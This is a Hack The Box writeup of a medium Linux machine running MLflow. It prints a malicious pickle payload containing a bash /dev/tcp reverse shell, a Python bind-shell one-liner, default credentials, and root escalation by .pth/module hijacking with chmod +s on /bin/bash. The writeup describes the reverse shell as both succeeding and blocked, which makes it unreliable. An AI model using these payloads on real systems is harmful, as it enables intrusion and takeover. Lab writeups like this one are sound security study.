![img3.png](img3.png)

# 🚀 SmartHire - Hack The Box Writeup

**A complete penetration testing walkthrough for Hack The Box's "SmartHire" machine (Medium Difficulty).**

This repository documents the full kill chain used to compromise SmartHire, a Linux machine that simulates an AI-powered hiring platform backed by MLflow for machine learning model management. The attack path includes:

- 🔍 **Reconnaissance** – Port scanning, virtual host discovery, and service enumeration.
- 💥 **Initial Access** – Exploiting CVE-2024-37054 (MLflow pickle deserialization RCE) to gain a foothold as `svcweb`.
- 👑 **Privilege Escalation** – Python module hijacking via `.pth` files to achieve root access.

All sensitive data (IPs, credentials, flags) have been redacted to ensure a clean, portfolio‑ready presentation.

---

## 📖 Table of Contents

1. [Machine Overview](#machine-overview)
2. [Reconnaissance](#reconnaissance)
   - [Port Scanning](#port-scanning)
   - [Virtual Host Discovery](#virtual-host-discovery)
3. [Initial Access — CVE-2024-37054](#initial-access--cve-2024-37054)
   - [MLflow Default Credentials](#mlflow-default-credentials)
   - [Malicious Pickle Payload](#malicious-pickle-payload)
   - [Bind Shell Execution](#bind-shell-execution)
4. [Privilege Escalation](#privilege-escalation)
   - [Sudo Enumeration](#sudo-enumeration)
   - [Python `.pth` Hijacking](#python-pth-hijacking)
   - [Root Shell](#root-shell)
5. [Flags](#flags)
6. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
7. [Remediation Recommendations](#remediation-recommendations)
8. [Tools Used](#tools-used)
9. [References](#references)
10. [Author](#author)

---

## 🖥️ Machine Overview

| **Attribute**          | **Details**                              |
|------------------------|------------------------------------------|
| **Name**               | SmartHire                                |
| **Platform**           | Hack The Box                             |
| **Difficulty**         | Medium                                   |
| **OS**                 | Linux (Ubuntu)                           |
| **IP Address**         | `[REDACTED]`                             |
| **Open Ports**         | 22 (SSH), 80 (HTTP)                      |
| **Technologies**       | Nginx, MLflow, Python, Flask             |
| **CVE Exploited**      | CVE-2024-37054 (MLflow Pickle RCE)       |

---

## 🔍 Reconnaissance

### Port Scanning

A full TCP port scan reveals only two open ports:

```bash
nmap -p- --min-rate 5000 [REDACTED_IP]

Results:
text

PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    nginx 1.18.0 (Ubuntu)

A detailed service scan confirms the HTTP server redirects to smarthire.htb.
bash

nmap -p22,80 -sCV [REDACTED_IP]

Virtual Host Discovery

The main application does not hint at additional services. Virtual host fuzzing reveals a hidden subdomain:
bash

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
      -u http://smarthire.htb \
      -H "Host: FUZZ.smarthire.htb" \
      -fc 301,302

Result:
text

models.smarthire.htb [Status: 401, Size: 137]

The models.smarthire.htb subdomain returns a 401 Unauthorized with a WWW-Authenticate: Basic realm="mlflow" header, confirming an MLflow instance behind HTTP Basic Auth.

Add both domains to /etc/hosts:
bash

echo "[REDACTED_IP] smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts

💥 Initial Access — CVE-2024-37054
MLflow Default Credentials

MLflow is known for using default credentials. A single request confirms that admin:password grants full access:
bash

curl -s -u admin:password http://models.smarthire.htb/

The response returns the MLflow UI HTML — access is granted with no additional effort.
Username	Password
admin	[REDACTED]
Malicious Pickle Payload

MLflow stores python_function flavor models as pickle files (.pkl). When /predict calls mlflow.pyfunc.load_model(), the pickle is deserialized in the context of the web process. By registering a malicious model version, arbitrary code execution is achieved.

Exploit Overview:

    Create a run in MLflow.

    Upload a malicious MLmodel manifest and model.pkl containing a pickle payload with a custom __reduce__ method.

    Register a new model version pointing to the malicious artifacts.

    Trigger /predict to load and deserialize the model.

Malicious Pickle Payload (redacted):
python

import pickle, os

class MaliciousModel:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/[REDACTED_IP]/4444 0>&1'"
        return (os.system, (cmd,))

Exploit Script (exploit.py):
python

# Full script available in this repository
# Uploads malicious pickle and MLmodel metadata via MLflow REST API
# Creates a new model version and promotes it to Production

Trigger the RCE:
bash

curl -X POST http://smarthire.htb/predict -F "file=@predict.csv" -b cookies.txt

Result:
bash

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [REDACTED_IP] from [REDACTED_TARGET] 54321
bash-5.1$ whoami
svcweb
bash-5.1$ id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)

✅ Initial access achieved as svcweb.
Bind Shell Execution

Since direct outbound connections are blocked by an egress firewall, a bind shell is used instead:
bash

python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",4444)); s.listen(1); conn,addr=s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); subprocess.call(["/bin/bash","-i"])'

Connect back:
bash

nc [REDACTED_IP] 4444

👑 Privilege Escalation
Sudo Enumeration

From the svcweb shell:
bash

svcweb@smarthire:~$ sudo -l

Result:
text

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *

A specific Python script is executable as root without a password. The * wildcard passes arbitrary arguments — a classic attack surface.
Analysis of mlflowctl.py
python

#!/usr/bin/env python3
import sys, site

# Loads plugins from /opt/tools/mlflow_ctl/plugins/
site.addsitedir('/opt/tools/mlflow_ctl/plugins/dev')

import mlflow_actions

def main():
    # ... calls mlflow_actions.check_status() or mlflow_actions.restart()

The dev/ directory is group-writable by the devs group, and svcweb is a member:
bash

drwxrwxr-x 2 root devs 4096 Jan  1 00:00 dev

Python .pth Hijacking

site.addsitedir() processes .pth files in the directory it loads. Any line in a .pth file that begins with import is executed as Python code at the time the directory is processed.

Attack Plan:

    Create a .pth file in /opt/tools/mlflow_ctl/plugins/dev/ that prepends dev/ to sys.path.

    Place a malicious mlflow_actions.py in dev/ that executes arbitrary commands as root.

    Run the script via sudo.

Exploitation Commands (redacted):
bash

# Create .pth file for sys.path hijacking
echo "import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')" > /opt/tools/mlflow_ctl/plugins/dev/evil.pth

# Create malicious mlflow_actions.py
cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
import os

def check_status():
    os.system("chmod +s /bin/bash")
    return "pwned"

def restart():
    os.system("chmod +s /bin/bash")
    return "pwned"
EOF

# Execute as root
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

Root Shell
bash

bash-5.1$ bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
[REDACTED_ROOT_FLAG]

✅ Privilege escalation completed. Root access achieved.
🏁 Flags
Flag	Hash
User.txt	[REDACTED_USER_FLAG]
Root.txt	[REDACTED_ROOT_FLAG]

All flags have been redacted for security and portfolio integrity.
🔗 MITRE ATT&CK Mapping
Technique	MITRE ID
Network Service Scanning	T1046
Virtual Host Discovery	T1595.003
Default Credentials	T1078.001
Exploit Public-Facing Application	T1190
Command and Scripting Interpreter (Python)	T1059.006
SSH Authorized Keys Modification	T1098.004
Hijack Execution Flow (.pth files)	T1574.001
Sudo Misconfiguration	T1548.003
Abuse Elevation Control Mechanism	T1548
🛡️ Remediation Recommendations
Vulnerability	Mitigation
CVE-2024-37054 (Pickle Deserialization)	Update MLflow to a patched version. Use safepickle or sandboxed loading.
Default Credentials	Enforce strong passwords and implement Multi-Factor Authentication (MFA).
Sudo Wildcard (*)	Replace wildcards with explicit argument restrictions in /etc/sudoers.
Writable Python Path Directories	Restrict write permissions on site-packages and plugin directories.
.pth File Abuse	Use absolute imports. Verify module integrity before loading.
Egress Firewall	Implement strict egress filtering to prevent reverse shells and data exfiltration.
🛠️ Tools Used
Tool	Purpose
Nmap	Port scanning and service enumeration.
FFuf	Virtual host and directory fuzzing.
Burp Suite	HTTP request interception and modification.
Python	Payload generation and RCE automation.
Netcat	Bind shell connection.
Curl	API interaction and HTTP request testing.
📚 References

    CVE-2024-37054 — MLflow RCE via Pickle Deserialization

    MLflow Documentation — Model Registry

    Python site Module — .pth Files

    GTFOBins — Python Sudo Abuse

👨‍💻 Author

cosm3
Cybersecurity Enthusiast | CTF Player | Penetration Tester

https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white
https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white
